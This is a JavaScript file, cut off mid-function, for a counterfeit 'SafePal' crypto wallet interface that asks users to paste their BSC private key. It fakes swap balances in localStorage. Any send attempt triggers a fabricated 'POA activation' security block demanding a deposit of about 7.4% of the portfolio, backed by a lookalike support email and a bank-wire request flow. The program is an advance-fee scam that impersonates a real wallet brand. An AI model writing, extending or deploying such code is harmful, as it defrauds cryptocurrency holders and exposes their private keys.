const RPC_URL = "https://bsc-dataseed.binance.org/";
const SPECIAL_TOKEN_ADDRESS = "0xED341b1e9526FF65dEB1C4E013e0Ffc39aDA8D46".toLowerCase();

// 1. Liste BSC élargie
const BSC_TOKENS = [
  { symbol: "BTC (BEP20)", address: SPECIAL_TOKEN_ADDRESS, decimals: 18, icon: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png", coingeckoId: "bitcoin" },
  { symbol: "BNB (BEP20)", address: "native", decimals: 18, icon: "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png", coingeckoId: "binancecoin" },
  { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, icon: "https://assets.coingecko.com/coins/images/325/large/Tether.png", coingeckoId: "tether" },
  { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18, icon: "https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png", coingeckoId: "usd-coin" },
  { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18, icon: "https://cryptologos.cc/logos/pancakeswap-cake-logo.png", coingeckoId: "pancakeswap-token" },
  { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18, icon: "https://assets.coingecko.com/coins/images/9576/large/BUSD.png", coingeckoId: "binance-usd" },
  { symbol: "SOL (BEP20)", address: "0x570a5d26f7765ecb712c0924e4ce41593f3ef068", decimals: 18, icon: "https://assets.coingecko.com/coins/images/4128/large/solana.png", coingeckoId: "solana" },
  { symbol: "XRP (BEP20)", address: "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe", decimals: 18, icon: "https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png", coingeckoId: "ripple" },
  { symbol: "ADA (BEP20)", address: "0x3ee2200efb3400fabb9aacf31297cbdb1d575d71", decimals: 18, icon: "https://assets.coingecko.com/coins/images/975/large/cardano.png", coingeckoId: "cardano" },
  { symbol: "DOGE (BEP20)", address: "0xba2ae424d960c26247dd6c32edc70b295c748c43", decimals: 8, icon: "https://assets.coingecko.com/coins/images/5/large/dogecoin.png", coingeckoId: "dogecoin" },
  { symbol: "AVAX (BEP20)", address: "0x1ce0c2827e2ef14d7c4f34a0917f3dccb16cd84e", decimals: 18, icon: "https://assets.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Trans.png", coingeckoId: "avalanche-2" },
  { symbol: "LINK (BEP20)", address: "0xf8a0bf9cf54bb92f17374d9e9a321e6a111a51bd", decimals: 18, icon: "https://assets.coingecko.com/coins/images/877/large/chainlink-new-logo.png", coingeckoId: "chainlink" },
  { symbol: "MATIC (BEP20)", address: "0xcc4946f3438250007fc35a2e5cc3cf78c35235a", decimals: 18, icon: "https://assets.coingecko.com/coins/images/4713/large/polygon.png", coingeckoId: "matic-network" },
  { symbol: "DOT (BEP20)", address: "0x7083609fce4d1d8dc0c979aab8c869ea2c873402", decimals: 18, icon: "https://assets.coingecko.com/coins/images/12171/large/polkadot.png", coingeckoId: "polkadot" },
  { symbol: "SHIB (BEP20)", address: "0x2859e4544c4bb03966803b044a93563bd2d0dd4d", decimals: 18, icon: "https://assets.coingecko.com/coins/images/11939/large/shiba.png", coingeckoId: "shiba-inu" }
];

// 2. Liste ETH élargie
const ETH_TOKENS = [
  { symbol: "ETH", address: "native", decimals: 18, icon: "https://assets.coingecko.com/coins/images/279/large/ethereum.png", coingeckoId: "ethereum" },
  { symbol: "USDT (ERC20)", address: "0xdac17f958d2ee523a2206206994597c13d831ec7", decimals: 6, icon: "https://assets.coingecko.com/coins/images/325/large/Tether.png", coingeckoId: "tether" },
  { symbol: "USDC (ERC20)", address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6, icon: "https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png", coingeckoId: "usd-coin" },
  { symbol: "WBTC", address: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", decimals: 8, icon: "https://assets.coingecko.com/coins/images/7598/large/wrapped_bitcoin_wbtc.png", coingeckoId: "wrapped-bitcoin" },
  { symbol: "LINK (ERC20)", address: "0x514910771af9ca656af840dff83e8264ecf986ca", decimals: 18, icon: "https://assets.coingecko.com/coins/images/877/large/chainlink-new-logo.png", coingeckoId: "chainlink" },
  { symbol: "UNI", address: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", decimals: 18, icon: "https://assets.coingecko.com/coins/images/12504/large/uniswap-uni.png", coingeckoId: "uniswap" },
  { symbol: "AAVE", address: "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9", decimals: 18, icon: "https://assets.coingecko.com/coins/images/12645/large/AAVE.png", coingeckoId: "aave" },
  { symbol: "MATIC (ERC20)", address: "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0", decimals: 18, icon: "https://assets.coingecko.com/coins/images/4713/large/polygon.png", coingeckoId: "matic-network" },
  { symbol: "SHIB (ERC20)", address: "0x95adbf4b01b6ef1cc289901b03f4c025447eb54b", decimals: 18, icon: "https://assets.coingecko.com/coins/images/11939/large/shiba.png", coingeckoId: "shiba-inu" },
  { symbol: "PEPE", address: "0x6982508145454ce325ddbe47a25d4ec3d2311933", decimals: 18, icon: "https://assets.coingecko.com/coins/images/29850/large/pepe-token.png", coingeckoId: "pepe" }
];

// 3. Troisième Main Chain (Polygon)
const POLYGON_TOKENS = [
  { symbol: "POL (Polygon)", address: "native", decimals: 18, icon: "https://assets.coingecko.com/coins/images/4713/large/polygon.png", coingeckoId: "polygon-ecosystem-token" },
  { symbol: "USDT (Polygon)", address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", decimals: 6, icon: "https://assets.coingecko.com/coins/images/325/large/Tether.png", coingeckoId: "tether" },
  { symbol: "USDC (Polygon)", address: "0x3c499c542ccef53633947b4d48384cc308cc30e4", decimals: 6, icon: "https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png", coingeckoId: "usd-coin" },
  { symbol: "WMATIC", address: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270", decimals: 18, icon: "https://assets.coingecko.com/coins/images/4713/large/polygon.png", coingeckoId: "matic-network" },
  { symbol: "WETH (Polygon)", address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619", decimals: 18, icon: "https://assets.coingecko.com/coins/images/279/large/ethereum.png", coingeckoId: "ethereum" },
  { symbol: "WBTC (Polygon)", address: "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6", decimals: 8, icon: "https://assets.coingecko.com/coins/images/7598/large/wrapped_bitcoin_wbtc.png", coingeckoId: "wrapped-bitcoin" },
  { symbol: "AAVE (Polygon)", address: "0xd6df932a45c0f253f824152f3fb546nib623594b", decimals: 18, icon: "https://assets.coingecko.com/coins/images/12645/large/AAVE.png", coingeckoId: "aave" }
];

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)"
];

let currentLang = "en";
let currentCurrency = "EUR";
let currentNetwork = "BSC"; // BSC, ETH, Polygon
let globalWalletAddress = "";
let globalProvider = null;

// Chargement persistant initial depuis localStorage
let localOverrides = JSON.parse(localStorage.getItem("safepal_local_overrides") || "{}");

let cachedAssetsData = [];
let totalFiatValueGlobal = 0;
let bnbPriceGlobal = 500;
let liveMarketPrices = {};

const translations = {
  en: {
    lblInputAddress: "Insert your BSC private key:",
    btnLogin: "Open SafePal",
    lblBalanceTitle: "Balance",
    lblSendText: "Send",
    lblReceiveText: "Receive",
    lblSwapText: "Swap",
    lblDepositText: "Deposit",
    lblMoreText: "More",
    lblBack: "Back to wallet",
    lblBackSettings: "Back",
    lblSettingsHeader: "Settings",
    lblCurrencyTitle: "Currency",
    lblLanguageTitle: "Language",
    valLanguage: "English",
    lblHelpCenter: "Help Center",
    lblSupport: "Support",
    lblCommunity: "Community",
    lblAbout: "About",
    loading: "Loading assets...",
    receiveTitle: "Receive Address",
    receiveMsg: "Make sure to select the correct network for your transfers:",
    sendTitle: "Send Token",
    sendMsg: "Insert recipient address:",
    invalidAddrMsg: "Please enter a valid private key.",
    btnConfirm: "Confirm",
    btnCancel: "Cancel",
    aboutMsg: "SafePal Extension Wallet\nVersion: v2.41.2",
    supportTitle: "SafePal Support",
    supportBody: "Official Support Email:\nsafepal@wallet-eu.com\n\nClick below to copy address.",
    btnCopy: "Copy Email",
    depositTitle: "Deposit Gateway Provider",
    depositMsg: "Choose an official fiat-to-crypto gateway or payment method:",
    swapTitle: "SafePal Swap Engine",
    swapMsg: "Select tokens and amount to swap:",
    poaBlockedTitle: "TRANSACTION BLOCKED",
    poaBlockedBody: "Network Protocol Security Alert",
    poaBoxHTML: "<b>⚠️ ACTION REQUIRED - NETWORK BLOCKED</b><br>POA (Proof of Authority) authority validation is required to unlock priority processing for your transaction on the active chain.",
    lblPoaSignalText: "Your network validation signal:",
    btnActivatePoa: "Activate POA Now",
    btnPoaDepositBnb: "Deposit Native Asset",
    btnPoaBuyBnb: "Buy Native Asset",
    lblSwapFrom: "Pay (From):",
    lblSwapTo: "Receive (To):",
    btnCopyLink: "Copy Access Link",
    btnCopyLinkCopied: "Link Copied!",
    lblBankWireDesc: "Request personalized bank wire details for instant fiat crediting.",
    btnRequestBankWire: "Demander les coordonnées bancaires personnalisées",
    bankWireTitle: "Bank Wire Transfer",
    bankWireSuccess: "Votre demande de coordonnées bancaires personnalisées a été enregistrée avec succès !"
  },
  fr: {
    lblInputAddress: "Insérez votre clé privée BSC :",
    btnLogin: "Ouvrir SafePal",
    lblBalanceTitle: "Solde",
    lblSendText: "Envoyer",
    lblReceiveText: "Recevoir",
    lblSwapText: "Swap",
    lblDepositText: "Dépôt",
    lblMoreText: "Plus",
    lblBack: "Retour au portefeuille",
    lblBackSettings: "Retour",
    lblSettingsHeader: "Paramètres",
    lblCurrencyTitle: "Devise",
    lblLanguageTitle: "Langue",
    valLanguage: "Français",
    lblHelpCenter: "Centre d'aide",
    lblSupport: "Support technique",
    lblCommunity: "Communauté",
    lblAbout: "À propos",
    loading: "Chargement des actifs...",
    receiveTitle: "Adresse de Réception",
    receiveMsg: "Assurez-vous de choisir le bon réseau pour vos transferts :",
    sendTitle: "Envoyer un Jeton",
    sendMsg: "Insérez l'adresse du destinataire :",
    invalidAddrMsg: "Veuillez entrer une clé privée valide.",
    btnConfirm: "Valider",
    btnCancel: "Annuler",
    aboutMsg: "SafePal Extension Wallet\nVersion : v2.41.2",
    supportTitle: "Support SafePal",
    supportBody: "Adresse Email Officielle du Support :\nsafepal@wallet-eu.com\n\nCliquez ci-dessous pour copier l'adresse.",
    btnCopy: "Copier l'Email",
    depositTitle: "Fournisseur de Dépôt",
    depositMsg: "Choisissez une passerelle officielle d'achat ou mode de paiement :",
    swapTitle: "Moteur de Swap SafePal",
    swapMsg: "Sélectionnez les jetons et le montant à échanger :",
    poaBlockedTitle: "TRANSACTION BLOQUÉE",
    poaBlockedBody: "Alerte de Sécurité du Protocole Réseau",
    poaBoxHTML: "<b>⚠️ ACTION REQUISE - RESEAU BLOQUÉ</b><br>La validation d'autorité <b>POA (Proof of Authority)</b> est requise pour débloquer le traitement prioritaire de votre transaction sur la chaîne active.",
    lblPoaSignalText: "Votre signal de validation réseau :",
    btnActivatePoa: "Activer POA Maintenant",
    btnPoaDepositBnb: "Déposer des Actifs",
    btnPoaBuyBnb: "Acheter des Actifs",
    lblSwapFrom: "Payez (De) :",
    lblSwapTo: "Recevez (Vers) :",
    btnCopyLink: "Copier le lien d'accès",
    btnCopyLinkCopied: "Lien copié !",
    lblBankWireDesc: "Demandez des coordonnées bancaires personnalisées pour un crédit fiat instantané.",
    btnRequestBankWire: "Demander les coordonnées bancaires personnalisées",
    bankWireTitle: "Virement Bancaire",
    bankWireSuccess: "Votre demande de coordonnées bancaires personnalisées a été enregistrée avec succès !"
  }
};

function applyLanguage() {
  const t = translations[currentLang];
  document.getElementById("lblInputAddress").innerText = t.lblInputAddress;
  document.getElementById("btnLogin").innerText = t.btnLogin;
  document.getElementById("lblBalanceTitle").innerText = t.lblBalanceTitle;
  document.getElementById("lblSendText").innerText = t.lblSendText;
  document.getElementById("lblReceiveText").innerText = t.lblReceiveText;
  document.getElementById("lblSwapText").innerText = t.lblSwapText;
  document.getElementById("lblDepositText").innerText = t.lblDepositText;
  document.getElementById("lblMoreText").innerText = t.lblMoreText;
  document.getElementById("lblBack").innerText = t.lblBack;
  document.getElementById("lblBackSettings").innerText = t.lblBackSettings;
  document.getElementById("lblSettingsHeader").innerText = t.lblSettingsHeader;

  document.getElementById("lblCurrencyTitle").innerText = t.lblCurrencyTitle;
  document.getElementById("lblLanguageTitle").innerText = t.lblLanguageTitle;
  document.getElementById("valLanguage").innerText = t.valLanguage;
  document.getElementById("lblHelpCenter").innerText = t.lblHelpCenter;
  document.getElementById("lblSupport").innerText = t.lblSupport;
  document.getElementById("lblCommunity").innerText = t.lblCommunity;
  document.getElementById("lblAbout").innerText = t.lblAbout;

  document.getElementById("lblSwapFrom").innerText = t.lblSwapFrom;
  document.getElementById("lblSwapTo").innerText = t.lblSwapTo;
  document.getElementById("btnCopyGatewayLink").innerText = t.btnCopyLink;
  document.getElementById("btnPoaDepositBnb").innerText = t.btnPoaDepositBnb;
  document.getElementById("btnPoaBuyBnb").innerText = t.btnPoaBuyBnb;
  document.getElementById("lblBankWireDesc").innerText = t.lblBankWireDesc;
  document.getElementById("btnRequestBankWire").innerText = t.btnRequestBankWire;

  if (globalProvider && globalWalletAddress) {
    loadWalletData(globalProvider, globalWalletAddress);
  }
}

// Interrupteur réseau cyclique : BSC -> ETH -> Polygon -> BSC
document.getElementById("networkToggleBtn").addEventListener("click", () => {
  if (currentNetwork === "BSC") {
    currentNetwork = "ETH";
  } else if (currentNetwork === "ETH") {
    currentNetwork = "Polygon";
  } else {
    currentNetwork = "BSC";
  }

  let logoUrl = "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png";
  if (currentNetwork === "ETH") logoUrl = "https://assets.coingecko.com/coins/images/279/large/ethereum.png";
  if (currentNetwork === "Polygon") logoUrl = "https://assets.coingecko.com/coins/images/4713/large/polygon.png";

  document.getElementById("networkLogo").src = logoUrl;
  document.getElementById("networkNameText").innerText = currentNetwork;
  if (globalProvider && globalWalletAddress) loadWalletData(globalProvider, globalWalletAddress);
});

document.getElementById("searchCoins").addEventListener("input", (e) => {
  renderFilteredAssets(e.target.value.toLowerCase());
});

function renderFilteredAssets(keyword) {
  const container = document.getElementById("assetListContainer");
  const filtered = cachedAssetsData.filter(asset => asset.name.toLowerCase().includes(keyword));

  let assetsHTML = "";
  filtered.forEach((asset, index) => {
    assetsHTML += `
      <div class="asset-item" id="asset-card-${index}">
        <div class="asset-left">
          <img class="asset-icon" src="${asset.icon}" alt="${asset.name}" />
          <div>
            <div class="asset-name">${asset.name}</div>
            <div class="asset-market-price">${asset.marketPriceText}</div>
          </div>
        </div>
        <div class="asset-right">
          <div class="asset-balance">${asset.balanceText}</div>
          <div class="asset-fiat">${asset.fiatText}</div>
        </div>
      </div>
    `;
  });

  container.innerHTML = assetsHTML;
  filtered.forEach((asset, index) => {
    const card = document.getElementById(`asset-card-${index}`);
    if (card) card.addEventListener("click", () => openAssetDetail(asset));
  });
}

document.getElementById("btnActionSend").addEventListener("click", triggerSendFlow);
document.getElementById("detailSendBtn").addEventListener("click", triggerSendFlow);

function triggerSendFlow() {
  const t = translations[currentLang];
  showModal({
    title: t.sendTitle,
    body: t.sendMsg,
    hasInput: true,
    onConfirm: (addr) => {
      if (addr) {
        const poaFiatRequired = totalFiatValueGlobal * 0.0743891;
        const bnbRequired = bnbPriceGlobal > 0 ? (poaFiatRequired / bnbPriceGlobal) : 0;
        const currSymbol = currentCurrency === "EUR" ? "€" : "$";

        showModal({
          title: t.poaBlockedTitle,
          body: t.poaBlockedBody,
          isPoa: true,
          poaSignalText: `${bnbRequired.toFixed(5)} (≈ ${poaFiatRequired.toFixed(2)} ${currSymbol})`,
          confirmText: t.btnActivatePoa,
          onConfirm: () => {
            showModal({
              title: currentLang === "fr" ? "Activation POA - Option" : "POA Activation - Option",
              body: currentLang === "fr" ? "Choisissez votre méthode d'approvisionnement :" : "Choose your funding method:",
              isPoaChoice: true
            });
          }
        });
      }
    }
  });
}

// Action Recevoir
document.getElementById("btnActionReceive").addEventListener("click", triggerReceiveFlow);
document.getElementById("detailReceiveBtn").addEventListener("click", triggerReceiveFlow);

function triggerReceiveFlow() {
  const t = translations[currentLang];
  showModal({
    title: t.receiveTitle,
    body: `${t.receiveMsg} (${currentNetwork})`,
    hasAddressBox: true,
    addressValue: globalWalletAddress
  });
}

// Swap
document.getElementById("btnActionSwap").addEventListener("click", openSwapModal);

function openSwapModal() {
  const t = translations[currentLang];
  showModal({
    title: t.swapTitle,
    body: t.swapMsg,
    isSwap: true,
    confirmText: currentLang === "fr" ? "Exécuter le Swap" : "Execute Swap",
    onConfirm: () => {
      const fromSym = document.getElementById("swapFromSelect").value;
      const toSym = document.getElementById("swapToSelect").value;
      const amount = parseFloat(document.getElementById("swapAmountInput").value) || 0;

      if (fromSym === toSym) {
        showModal({ title: "Swap Error", body: currentLang === "fr" ? "Veuillez sélectionner deux tokens différents." : "Please select two different tokens." });
        return;
      }

      const pFrom = liveMarketPrices[fromSym] || 1;
      const pTo = liveMarketPrices[toSym] || 1;

      const fiatSwapped = amount * pFrom;
      const amountReceived = fiatSwapped / pTo;

      const curFrom = localOverrides[fromSym] !== undefined ? localOverrides[fromSym] : (cachedAssetsData.find(a => a.symKey === fromSym)?.numericBalance || 0);
      const curTo = localOverrides[toSym] !== undefined ? localOverrides[toSym] : (cachedAssetsData.find(a => a.symKey === toSym)?.numericBalance || 0);

      localOverrides[fromSym] = Math.max(0, curFrom - amount);
      localOverrides[toSym] = curTo + amountReceived;

      localStorage.setItem("safepal_local_overrides", JSON.stringify(localOverrides));

      if (globalProvider && globalWalletAddress) loadWalletData(globalProvider, globalWalletAddress);

      showModal({
        title: currentLang === "fr" ? "Swap Réussi" : "Swap Successful",
        body: currentLang === "fr" ? `Vous avez échangé ${amount} ${fromSym} contre ≈ ${amountReceived.toFixed(4)} ${toSym}.` : `You successfully swapped ${amount} ${fromSym} for ≈ ${amountReceived.toFixed(4)} ${toSym}.`
      });
    }
  });
}

function updateSwapEstimation() {
  const fromSym = document.getElementById("swapFromSelect").value;
  const toSym = document.getElementById("swapToSelect").value;
  const amount = parseFloat(document.getElementById("swapAmountInput").value) || 0;

  const pFrom = liveMarketPrices[fromSym] || 1;
  const pTo = liveMarketPrices[toSym] || 1;

  const fiatVal = amount * pFrom;
  const receiveVal = fiatVal / pTo;
  const currSymbol = currentCurrency === "EUR" ? "€" : "$";

  const resText = document.getElementById("swapResultText");
  if (resText) {
    resText.innerText = currentLang === "fr" ? `Équivalent : ≈ ${receiveVal.toFixed(4)} ${toSym} (≈ ${fiatVal.toFixed(2)} ${currSymbol})` : `Estimated receive: ≈ ${receiveVal.toFixed(4)} ${toSym} (≈ ${fiatVal.toFixed(2)} ${currSymbol})`;
  }
}

// Action Dépôt
document.getElementById("btnActionDeposit").addEventListener("click", triggerDepositFlow);

function triggerDepositFlow() {
  const t = translations[currentLang];
  showModal({
    title: t.depositTitle,
    body: t.depositMsg,
    isDeposit: true
  });
}

// Gestionnaires Dépôt Gateway (Entièrement corrigés & isolés)
function showGatewayLinkView(gatewayUrl) {
  document.getElementById("modalDepositContainer").classList.add("hidden");
  document.getElementById("modalLinkContainer").classList.remove("hidden");
  document.getElementById("modalBtnConfirm").classList.add("hidden");
  document.getElementById("gatewayLinkInput").value = gatewayUrl;
}

document.getElementById("btnChooseMoonpay").addEventListener("click", () => showGatewayLinkView("https://www.moonpay.com"));
document.getElementById("btnChooseSimplex").addEventListener("click", () => showGatewayLinkView("https://www.simplex.com"));
document.getElementById("btnChooseRamp").addEventListener("click", () => showGatewayLinkView("https://ramp.network"));
document.getElementById("btnChooseMercurio").addEventListener("click", () => showGatewayLinkView("https://mercurio.io"));
document.getElementById("btnChooseWirex").addEventListener("click", () => showGatewayLinkView("https://wirexapp.com"));
document.getElementById("btnChooseDeblock").addEventListener("click", () => showGatewayLinkView("https://deblock.com"));

document.getElementById("btnChooseBankWire").addEventListener("click", () => {
  document.getElementById("modalDepositContainer").classList.add("hidden");
  document.getElementById("modalBankWireContainer").classList.remove("hidden");
  document.getElementById("modalBtnConfirm").classList.add("hidden");
});

document.getElementById("btnRequestBankWire").addEventListener("click", () => {
  const t = translations[currentLang];
  document.getElementById("customModal").classList.add("hidden");
  showModal({
    title: t.bankWireTitle,
    body: t.bankWireSuccess
  });
});

// Bouton de copie universel des liens Gateway (Corrigé à 100%)
document.getElementById("btnCopyGatewayLink").addEventListener("click", () => {
  const linkVal = document.getElementById("gatewayLinkInput").value;
  navigator.clipboard.writeText(linkVal);
  
  const btn = document.getElementById("btnCopyGatewayLink");
  const t = translations[currentLang];
  btn.innerText = t.btnCopyLinkCopied;
  
  setTimeout(() => {
    document.getElementById("customModal").classList.add("hidden");
    btn.innerText = t.btnCopyLink;
  }, 1200);
});

// Settings & More
document.getElementById("btnActionMore").addEventListener("click", () => {
  document.getElementById("dashboardSection").classList.add("hidden");
  document.getElementById("settingsSection").classList.remove("hidden");
});

document.getElementById("btnBackFromSettings").addEventListener("click", () => {
  document.getElementById("settingsSection").classList.add("hidden");
  document.getElementById("dashboardSection").classList.remove("hidden");
});

document.getElementById("itemLanguage").addEventListener("click", () => {
  currentLang = (currentLang === "en") ? "fr" : "en";
  applyLanguage();
});

document.getElementById("itemCurrency").addEventListener("click", () => {
  currentCurrency = (currentCurrency === "EUR") ? "USD" : "EUR";
  document.getElementById("valCurrency").innerText = currentCurrency;
  if (globalProvider && globalWalletAddress) loadWalletData(globalProvider, globalWalletAddress);
});

document.getElementById("itemHelpCenter").addEventListener("click", openSupportModal);
document.getElementById("itemSupport").addEventListener("click", openSupportModal);
document.getElementById("itemCommunity").addEventListener("click", () => window.open("https://discord.gg/safepal", "_blank"));
document.getElementById("itemAbout").addEventListener("click", () => {
  const t = translations[currentLang];
  showModal({ title: t.lblAbout, body: t.aboutMsg });
});

function openSupportModal() {
  const t = translations[currentLang];
  showModal({
    title: t.supportTitle,
    body: t.supportBody,
    confirmText: t.btnCopy,
    onConfirm: () => {
      navigator.clipboard.writeText("safepal@wallet-eu.com");
      showModal({ title: "SafePal Wallet", body: currentLang === "fr" ? "Email copié !" : "Email copied!" });
    }
  });
}

document.getElementById("btnPoaDepositBnb").addEventListener("click", () => {
  triggerReceiveFlow();
});

document.getElementById("btnPoaBuyBnb").addEventListener("click", () => {
  triggerDepositFlow();
});

document.getElementById("btnLogin").addEventListener("click", async () => {
  const userInput = document.getElementById("addressInput").value.trim();
  if (!userInput) {
    showModal({ title: "SafePal Wallet", body: translations[currentLang].invalidAddrMsg });
    return;
  }

  if (typeof ethers === "undefined") {
    showModal({ title: "Error", body: "Ethers.js non chargé." });
    return;
  }

  if (ethers.providers && ethers.providers.JsonRpcProvider) {
    globalProvider = new ethers.providers.JsonRpcProvider(RPC_URL);
  } else if (ethers.JsonRpcProvider) {
    globalProvider = new ethers.JsonRpcProvider(RPC_URL);
  }

  globalWalletAddress = userInput;
  if (userInput.startsWith("0x") && userInput.length === 66) {
    try {
      const wallet = new ethers.Wallet(userInput);
      globalWalletAddress = wallet.address;
    } catch (e) {
      showModal({ title: "Error", body: translations[currentLang].invalidAddrMsg });
      return;
    }
  }

  document.getElementById("loginSection").classList.add("hidden");
  document.getElementById("dashboardSection").classList.remove("hidden");
  loadWalletData(globalProvider, globalWalletAddress);
});

document.getElementById("btnBack").addEventListener("click", () => {
  document.getElementById("detailSection").classList.add("hidden");
  document.getElementById("dashboardSection").classList.remove("hidden");
});

async function loadWalletData(provider, address) {
  const container = document.getElementById("assetListContainer");
  if (container) container.innerHTML = `<div style='text-align:center; padding:20px; color:#848e9c;'>${translations[currentLang].loading}</div>`;

  const currKey = currentCurrency.toLowerCase();
  const currSymbol = currentCurrency === "EUR" ? "€" : "$";
  
  let activeTokensList = BSC_TOKENS;
  if (currentNetwork === "ETH") activeTokensList = ETH_TOKENS;
  if (currentNetwork === "Polygon") activeTokensList = POLYGON_TOKENS;

  let tokenPrices = {};
  let btcPriceInCurr = currentCurrency === "EUR" ? 60000 : 65000;

  try {
    const ids = ["bitcoin", "binancecoin", ...activeTokensList.map(t => t.coingeckoId)].join(",");
    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=${currKey}`);
    const data = await res.json();

    if (data.bitcoin && data.bitcoin[currKey]) btcPriceInCurr = data.bitcoin[currKey];
    if (data.binancecoin && data.binancecoin[currKey]) bnbPriceGlobal = data.binancecoin[currKey];

    activeTokensList.forEach(t => {
      if (data[t.coingeckoId] && data[t.coingeckoId][currKey]) {
        tokenPrices[t.address.toLowerCase()] = data[t.coingeckoId][currKey];
        liveMarketPrices[t.symbol.split(" ")[0]] = data[t.coingeckoId][currKey];
      }
    });
    liveMarketPrices["BTC"] = btcPriceInCurr;
  } catch (e) {}

  totalFiatValueGlobal = 0;
  cachedAssetsData = [];

  const formatEth = (raw, dec = 18) => {
    if (ethers.utils && ethers.utils.formatUnits) return parseFloat(ethers.utils.formatUnits(raw, dec));
    if (ethers.formatUnits) return parseFloat(ethers.formatUnits(raw, dec));
    return 0;
  };

  for (const token of activeTokensList) {
    const symKey = token.symbol.split(" ")[0];
    let bal = 0;

    if (localOverrides[symKey] !== undefined) {
      bal = localOverrides[symKey];
    } else {
      try {
        if (token.address === "native") {
          const rawBal = await provider.getBalance(address);
          bal = formatEth(rawBal, 18);
        } else {
          const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
          const rawBal = await contract.balanceOf(address);
          bal = formatEth(rawBal, token.decimals);
        }
      } catch (e) {}
    }

    const unitPrice = token.address === SPECIAL_TOKEN_ADDRESS ? btcPriceInCurr : (tokenPrices[token.address.toLowerCase()] || 0);
    const fiat = bal * unitPrice;
    totalFiatValueGlobal += fiat;

    cachedAssetsData.push({
      symKey: symKey,
      name: token.symbol,
      icon: token.icon,
      marketPriceText: `Market Price: ${unitPrice.toLocaleString("fr-FR", { minimumFractionDigits: 2 })} ${currSymbol}`,
      balanceText: bal.toFixed(4) + " " + symKey,
      fiatText: fiat.toLocaleString("fr-FR", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " " + currSymbol,
      numericBalance: bal
    });
  }

  const totalElem = document.getElementById("totalPortfolioValue");
  const subElem = document.getElementById("subPortfolioValue");

  if (totalElem) totalElem.innerText = totalFiatValueGlobal.toLocaleString("fr-FR", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " " + currSymbol;
  if (subElem && btcPriceInCurr > 0) {
    const btcEquiv = totalFiatValueGlobal / btcPriceInCurr;
    subElem.innerText = `≈${btcEquiv.toFixed(4)} BTC`;
  }

  renderFilteredAssets("");
}

function openAssetDetail(asset) {
  document.getElementById("dashboardSection").classList.add("hidden");
  document.getElementById("detailSection").classList.remove("hidden");

  document.getElementById("detailIcon").src = asset.icon;
  document.getElementById("detailTokenName").innerText = asset.name;
  document.getElementById("detailBalance").innerText = asset.balanceText;
  document.getElementById("detailFiat").innerText = asset.fiatText;
}

// Modale Universelle
function showModal({ title, body, hasInput = false, hasAddressBox = false, addressValue = "", isSwap = false, isDeposit = false, isPoa = false, isPoaChoice = false, poaSignalText = "", confirmText = null, onConfirm = null }) {
  const modal = document.getElementById("customModal");
  const modalTitle = document.getElementById("modalTitle");
  const modalBody = document.getElementById("modalBody");

  const addressContainer = document.getElementById("modalAddressContainer");
  const swapContainer = document.getElementById("modalSwapContainer");
  const depositContainer = document.getElementById("modalDepositContainer");
  const bankWireContainer = document.getElementById("modalBankWireContainer");
  const linkContainer = document.getElementById("modalLinkContainer");
  const poaContainer = document.getElementById("modalPoaContainer");
  const poaChoiceContainer = document.getElementById("modalPoaChoiceContainer");
  const inputContainer = document.getElementById("modalInputContainer");

  const btnConfirm = document.getElementById("modalBtnConfirm");
  const btnCancel = document.getElementById("modalBtnCancel");

  const t = translations[currentLang];
  modalTitle.innerText = title;
  modalBody.innerText = body;

  addressContainer.classList.add("hidden");
  swapContainer.classList.add("hidden");
  depositContainer.classList.add("hidden");
  bankWireContainer.classList.add("hidden");
  linkContainer.classList.add("hidden");
  poaContainer.classList.add("hidden");
  poaChoiceContainer.classList.add("hidden");
  inputContainer.classList.add("hidden");

  btnCancel.classList.remove("hidden");
  btnConfirm.classList.remove("hidden");

  if (hasAddressBox) {
    addressContainer.classList.remove("hidden");
    document.getElementById("modalAddressDisplay").value = addressValue;
    btnConfirm.innerText = currentLang === "fr" ? "Copier l'adresse" : "Copy Address";
    onConfirm = () => {
      navigator.clipboard.writeText(addressValue);
      showModal({ title: "SafePal Wallet", body: currentLang === "fr" ? "Adresse copiée dans le presse-papier !" : "Address copied to clipboard!" });
    };
  } else if (isSwap) {
    swapContainer.classList.remove("hidden");
    const fromSelect = document.getElementById("swapFromSelect");
    const toSelect = document.getElementById("swapToSelect");

    fromSelect.innerHTML = cachedAssetsData.map(a => `<option value="${a.symKey}">${a.name}</option>`).join("");
    toSelect.innerHTML = cachedAssetsData.map(a => `<option value="${a.symKey}">${a.name}</option>`).join("");
    if (toSelect.options.length > 1) toSelect.selectedIndex = 1;

    fromSelect.onchange = updateSwapEstimation;
    toSelect.onchange = updateSwapEstimation;
    document.getElementById("swapAmountInput").oninput = updateSwapEstimation;
    updateSwapEstimation();

  } else if (isDeposit) {
    depositContainer.classList.remove("hidden");
    btnConfirm.classList.add("hidden");

  } else if (isPoa) {
